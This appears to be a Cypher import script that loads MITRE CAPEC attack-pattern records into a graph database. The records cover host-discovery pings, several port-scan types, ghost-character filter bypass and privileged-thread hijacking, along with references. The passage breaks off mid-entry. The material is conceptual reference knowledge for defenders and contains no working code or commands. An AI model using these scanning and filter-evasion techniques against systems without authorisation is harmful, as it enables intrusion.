MERGE (:Reference{id: "REF-21", local_id: "R.297.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.297.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.6.2 TCP ACK Ping, pg. 61", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-28", local_id: "R.297.4", author: "Mark Wolfgang", title: "Host Discovery with Nmap", pubdate: "November 2002", link: "http://nmap.org/docs/discovery.pdf"});
CREATE (:ResourcesRequired{id: 164, text: "<div level=\"0\">\n  <p class=\"text\">The ability to craft custom TCP ACK segments for use during network reconnaissance. ACK scanning can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 298, name: "UDP Ping", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 249, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send a UDP datagram to a remote host and receive a response.</p>\n</div>"});
CREATE (:Submission{id: 277});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 271, summary: "OrderedDict([('Text', \"An attacker sends a UDP datagram to the remote host to determine if the host is alive. If a UDP datagram is sent to an open UDP port there is very often no response, so a typical strategy for using a UDP ping is to send the datagram to a random high port on the target. The goal is to solicit an ICMP port unreachable message from the target, indicating that the host is alive. UDP pings are useful because some firewalls are not configured to block UDP datagrams sent to strange or typically unused ' ports, like ports in the 65K range. Additionally, while some firewalls may filter incoming ICMP, weaknesses in firewall rule-sets may allow certain types of ICMP (host unreachable, port unreachable) which are useful for UDP ping attempts. A UDP Ping has the following characteristics:\"), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Host Discovery: Can be used to discover if a host is alive via ICMP Port Unreachable Messages.', '2. Effective Against: Firewalls that allow some incoming UDP which are not configured to block egress ICMP messages.', '3. Weak Against: Firewalls properly configured to block UDP datagrams that are also block egress ICMP messages.', '4. Port State: Able to determine if a port is closed via ICMP Port Unreachable Messages.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.298.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 47", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-27", local_id: "R.298.2", author: "J. Postel", title: "RFC768 - User Datagram Protocol", pubdate: "August 28, 1980", link: "http://www.faqs.org/rfcs/rfc768.html"});
MERGE (:Reference{id: "REF-28", local_id: "R.298.3", author: "Mark Wolfgang", title: "Host Discovery with Nmap", pubdate: "November 2002", link: "http://nmap.org/docs/discovery.pdf"});
MERGE (:Reference{id: "REF-22", local_id: "R.298.4", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.6.3 TCP UDP Ping, pg. 63", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
CREATE (:ResourcesRequired{id: 165, text: "<div level=\"0\">\n  <p class=\"text\">The ability to craft custom UDP Packets for use during network reconnaissance. UDP pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 299, name: "TCP SYN Ping", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 250, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send a TCP SYN packet to a remote target. Depending upon the operating system, the ability to craft SYN packets may require elevated privileges.</p>\n</div>"});
CREATE (:Submission{id: 278});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 272, summary: "OrderedDict([('Text', 'An attacker uses a TCP SYN packets as a means of purpose of host discovery. Typical RFC 793 behavior specifies that when a TCP port is open, a host must respond to an incoming SYN \"synchronize\" packet by completing stage two of the \\'three-way handshake\\' by sending an SYN/ACK in response. When a port is closed, RFC 793 behavior is to respond with a RST \"reset\" packet. This behavior can be used to \\'ping\\' a target to see if it is alive by sending a TCP SYN packet to a port and then looking for a RST or an ACK packet in response. Due to the different responses from open and closed ports, SYN packets can be used to determine the remote state of the port. A TCP SYN ping is also useful for discovering alive hosts protected by a stateful firewall. In cases where a specific firewall rule does not block access to a port, a SYN packet can pass through the firewall to the host and solicit a response from either an open or closed port. When a stateful firewall is present SYN pings are preferable to ACK pings, because a stateful firewall will typically drop all unsolicited ACK packets because they are not part of an existing or new connection. TCP SYN pings often fail when a stateless ACL or firewall is configured to blanket-filter incoming packets to a port. The firewall device will discard any SYN packets to a blocked port. An attacker will often alternate between SYN and ACK pings to discover if a host is alive. A TCP SYN ping has the following characteristics:'), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Host Discovery: Can be used to discover if a host is alive via ACK or RST packets.', '2. Effective Against: Stateful Firewalls that allow incoming new connections to target ports.', '3. Weak Against: Stateless firewalls that blanket-filter incoming SYN', '4. Port State: Able to determine port state via SYN/ACK or RST response.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.299.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 48", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.299.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.299.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 3.6.2 TCP SYN Ping, pg. 61", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-28", local_id: "R.299.4", author: "Mark Wolfgang", title: "Host Discovery with Nmap", pubdate: "November 2002", link: "http://nmap.org/docs/discovery.pdf"});
CREATE (:ResourcesRequired{id: 166, text: "<div level=\"0\">\n  <p class=\"text\">The ability to craft custom TCP segments for use during network reconnaissance. SYN pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 3, name: "Using Leading 'Ghost' Character Sequences to Bypass Input Filters", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 251, text: "<div level=\"0\">\n  <p class=\"text\">The targeted API must ignore the leading ghost characters that are used to get past the filters for the semantics to be the same.</p>\n</div>"});
CREATE (:Submission{id: 279});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 216});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 217});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 218});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 219});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Description{id: 273, summary: "OrderedDict([('Text', ['An attacker intentionally introduces leading characters that enable getting the input past the filters. The API that is being targeted, ignores the leading \"ghost\" characters, and therefore processes the attackers\\' input. This occurs when the targeted API will accept input data in several syntactic forms and interpret it in the equivalent semantic way, while the filter does not take into account the full spectrum of the syntactic forms acceptable to the targeted API.', 'Some APIs will strip certain leading characters from a string of parameters. Perhaps these characters are considered redundant, and for this reason they are removed. Another possibility is the parser logic at the beginning of analysis is specialized in some way that causes some characters to be removed. The attacker can specify multiple types of alternative encodings at the beginning of a string as a set of probes.', \"One commonly used possibility involves adding ghost characters--extra characters that don't affect the validity of the request at the API layer. If the attacker has access to the API libraries being targeted, certain attack ideas can be tested directly in advance. Once alternative ghost encodings emerge through testing, the attacker can move from lab-based API testing to testing real-world service implementations.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine if the source code is available and if so, examine the filter logic.</p>\n</div>"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">If the source code is not available, write a small program that loops through various possible inputs to given API call and tries a variety of alternate (but equivalent) encodings of strings with leading ghost characters. Knowledge of frameworks and libraries used and what filters they apply will help to make this search more structured.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Observe the effects. See if the probes are getting past the filters. Identify a string that is semantically equivalent to that which an attacker wants to pass to the targeted API, but syntactically structured in a way as to get past the input filter. That encoding will contain certain ghost characters that will help it get past the filters. These ghost characters will be ignored by the targeted API.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Once the \"winning\" alternate encoding using (typically leading) ghost characters is identified, an attacker can launch the attacks against the targeted API (e.g. directory traversal attack, arbitrary shell command execution, corruption of files)</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.3.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 41});
MERGE (:CWE{id: 172});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 179});
MERGE (:CWE{id: 180});
MERGE (:CWE{id: 181});
MERGE (:CWE{id: 183});
MERGE (:CWE{id: 184});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 707});
CREATE (:AttackPattern{id: 30, name: "Hijacking a Privileged Thread of Execution", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 252, text: "<div level=\"0\">\n  <p class=\"text\">The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal users</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 253, text: "<div level=\"0\">\n  <p class=\"text\">In order to feasibly execute this class of attacks, the attacker must have the ability to hijack a privileged thread.</p>\n  <p class=\"text\">This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.</p>\n  <p class=\"text\">This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.</p>\n</div>"});
CREATE (:Submission{id: 280});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 220});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 274, summary: "OrderedDict([('Text', ['Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means.', \"Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker determines the underlying system thread that is subject to user-control</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker then provides input, perhaps by way of environment variables for the process in question, that affect the executing thread</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Upon successful hijacking, the attacker enjoys elevated privileges, and can possibly have the hijacked thread do his bidding</p>\n</div>"});
MERGE (:CWE{id: 270});
CREATE (:ResourcesRequired{id: 168, text: "<div level=\"0\">\n  <p class=\"text\">The attacker needs to be able to latch onto a privileged thread. No special hardware or software tool-based resources are required.</p>\n  <p class=\"text\">The Attacker does, however, need to be able to program, compile, and link to the victim binaries being executed so that it will turn control of a privileged thread over to the Attacker's malicious code. This is the case even if the attacker conducts the attack remotely.</p>\n</div>"});
CREATE (:AttackPattern{id: 300, name: "Port Scanning", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 281});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 275, summary: "OrderedDict([('Text', ['An attacker uses a combination of techniques to determine the state of the ports on a remote target. Any service or application available for TCP or UDP networking will have a port open for communications over the network. Although common services have assigned port numbers, services and applications can run on arbitrary ports. Additionally, port scanning is complicated by the potential for any machine to have up to 65535 possible UDP or TCP services. The goal of port scanning is often broader than identifying open ports, but also give the attacker information concerning the firewall configuration. Depending upon the method of scanning that is used, the process can be stealthy or more obtrusive, the latter being more easily detectable due to the volume of packets involved, anomalous packet traits, or system logging. Typical port scanning activity involves sending probes to a range of ports and observing the responses. There are four types of port status that a port scan usually attempts to discover:', \"For strategic purposes it is useful for an attacker to distinguish between an open port that is protected by a filter vs. a closed port that is not protected by a filter. Making these fine grained distinctions is impossible with certain scan types. A TCP connect scan, for instance, cannot distinguish a blocked port with an active service from a closed port that is not firewalled. Other scan types can only detect closed ports, while others cannot detect port state at all, only the presence or absence of filters. Collecting this type of information tells the attacker which ports can be attacked directly, which must be attacked with filter evasion techniques like fragmentation, source port scans, and which ports are unprotected (i.e. not firewalled) but aren't hosting a network service. An attacker often combines various techniques in order to gain a more complete picture of the firewall filtering mechanisms in place for a host.\"]), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Open Port: The port is open and a firewall does not block access to the port', '2. Closed Port: The port is closed (i.e. no service resides there) and a firewall does not block access to the port', '3. Filtered Port: A firewall or ACL rule is blocking access to the port in some manner, although the presence of a listening service on the port cannot be verified', '4. Unfiltered Port: A firewall or ACL rule is not blocking access to the port, although the presence of a listening service on the port cannot be verified.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.300.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 54", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.300.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-27", local_id: "R.300.3", author: "J. Postel", title: "RFC768 - User Datagram Protocol", pubdate: "August 28, 1980", link: "http://www.faqs.org/rfcs/rfc768.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.300.4", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 4.1 Introduction to Port Scanning, pg. 73", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.300.5", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 169, text: "<div level=\"0\">\n  <p class=\"text\">The ability to craft arbitrary packets of various protocol types for use during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 301, name: "TCP Connect Scan", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 255, text: "<div level=\"0\">\n  <p class=\"text\">The TCP connect requires the ability to connect to an available port and complete a 'three-way-handshake' This scanning technique does not require any special privileges in order to perform. This type of scan works against all TCP/IP stack implementations.</p>\n</div>"});
CREATE (:Submission{id: 282});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 276, summary: "OrderedDict([('Text', [\"An attacker uses full TCP connection attempts to determine if a port is open. The scanning process involves completing a 'three-way handshake' with a remote port, and reports the port as closed if the full handshake cannot be established. An advantage of TCP connect scanning is that it works against any TCP/IP stack. RFC 793 defines how TCP connections are established and torn down. TCP connect scanning commonly involves establishing a full connection, and then subsequently tearing it down, and therefore involves sending a significant number of packets to each port that is scanned. This type of scanning has the following characteristics. Compared to other types of scans, a TCP Connect scan is slow and methodical. This type of scanning causes considerable noise in system logs and can be spotted by IDS/IPS systems. In terms of port status, TCP Connect scanning can detect when a port is open by completing the three-way handshake, but it cannot distinguish a port that is unfiltered with no service running on it from a port that is filtered by a firewall but contains an active service. Due to the significant volume of packets exchanged per port, TCP connect scanning can become very time consuming. Generally, it is not used as a method for performing a comprehensive port scan, but is reserved for checking a short list of common ports. A TCP Connect scan has the following characteristics:\", 'The TCP Connect scan has the advantage of versatility and ease of use in that it works equally well against all TCP stacks and that it is easy for a novice to interpret the results of the scan due to its all or nothing nature. Its disadvantages are noise, speed, and poor visibility into the filter structure of a firewall. As a general rule, performing a full TCP connect scan against a host can take multiple days.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Speed: TCP Connect scanning is very slow.', '2. Stealth: TCP SYN scanning is extremely noisy and involves a significant number of packets.', '3. Open Port: Detects that a port is open via a successful three-way handshake', '4. Filtered Port: Cannot distinguish a closed (unfiltered) port from an open (filtered) port.', '5 .Unfiltered Port: Can detect an unfiltered port only when the unfiltered port is in front of an active TCP/IP service.'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.301.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 54", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.301.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.301.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 5.3 TCP Connect Scanning, pg. 100", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.301.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 170, text: "<div level=\"0\">\n  <p class=\"text\">The ability to build full TCP connections with a target. This can be achieved via the use of a network mapper or scanner, or via routine socket programming in a scripting language. This can be achieved via the use of a network mapper or scanner, or via socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 302, name: "TCP FIN scan", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 256, text: "<div level=\"0\">\n  <p class=\"text\">FIN scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</p>\n</div>"});
CREATE (:Submission{id: 283});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 277, summary: "OrderedDict([('Text', [\"An attacker uses a TCP FIN scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the FIN bit set in the packet header. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. The major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. FIN packets, like out-of-state ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports.\", 'FIN scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, FIN scanning a system protected by a stateful firewall may indicate all ports being open. For these reasons, FIN scanning results must always be interpreted as part of a larger scanning strategy. FIN scanning is still relatively stealthy as the packets tend to blend in with the background noise on a network link. FIN scans are detected via heuristic (non-signature) based algorithms, much in the same way as other scan types are detected.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Speed: TCP FIN scanning is fast compared to other types of scans', '2. Stealth: TCP FIN scanning is stealthy compared to other types of scans', '3. Open Port: Detects an open port via no response to the segment', '4. Closed Port: Detects that a closed via a RST received in response to the FIN', '5. Filtered Port: Cannot distinguish between a filtered port and an open port', '6. Unfiltered Port: Cannot distinguish between an unfiltered port and a non-stateful filtered port'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.302.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 55", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.302.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.302.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 5.5 TCP FIN, NULL, XMAS Scans, pg. 107", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.302.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 171, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send TCP FIN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 303, name: "TCP Xmas Scan", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 257, text: "<div level=\"0\">\n  <p class=\"text\">XMAS scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</p>\n</div>"});
CREATE (:Submission{id: 284});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 278, summary: "OrderedDict([('Text', [\"An attacker uses a TCP XMAS scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the all flags sent in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. he major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. XMAS packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports.\", 'XMAS scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, XMAS scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, XMAS scans are flagged by almost all intrusion prevention or intrusion detection systems.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['1. Speed: TCP XMAS scanning is fast compared to other types of scans', '2. Stealth: TCP XMAS scanning was once stealthy, but is now easily detected by IDS/IPS systems', '3. Open Port: Detects an open port via no response to the segment', '4. Closed Port: Detects that a closed via a RST received in response to the FIN', '5. Filtered Port: Cannot distinguish between a filtered port and an open port', '6. Unfiltered Port: Cannot distinguish between an unfiltered port and a non-stateful filtered port'])]))])"});
MERGE (:Reference{id: "REF-20", local_id: "R.303.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 2: Scanning, pg. 56", publisher: "McGraw Hill", pubdate: "2009"});
MERGE (:Reference{id: "REF-21", local_id: "R.303.2", author: "['Defense Advanced Research Projects Agency Information Processing Techniques Office', 'Information Sciences Institute University of Southern California']", title: "RFC793 - Transmission Control Protocol", publisher: "Defense Advanced Research Projects Agency (DARPA)", pubdate: "September 1981", link: "http://www.faqs.org/rfcs/rfc793.html"});
MERGE (:Reference{id: "REF-22", local_id: "R.303.3", author: "Gordon \"Fyodor\" Lyon", title: "Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning", section: "Section 5.5 TCP FIN, NULL, XMAS Scans, pg. 107", publisher: "Insecure.com LLC, ISBN: 978-0-9799587-1-7", pubdate: "2008"});
MERGE (:Reference{id: "REF-10", local_id: "R.303.4", author: "Gordon \"Fyodor\" Lyon", title: "The Art of Port Scanning", pubdate: "1997", link: "http://www.phrack.org/issues.html?issue=51&id=11#article"});
CREATE (:ResourcesRequired{id: 172, text: "<div level=\"0\">\n  <p class=\"text\">The ability to send TCP segments with every flag set to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.</p>\n</div>"});
CREATE (:AttackPattern{id: 304, name: "TCP Null Scan", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 258, text: "<div level=\"0\">\n  <p class=\"text\">NULL scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.</p>\n</div>"});
CREATE (:Submission{id: 285});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 279, summary: "OrderedDict([('Text', [\"An attacker uses a TCP NULL scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with no flags in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. he major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. NULL packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason NULL scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports.\", 'NULL scans are limited by the 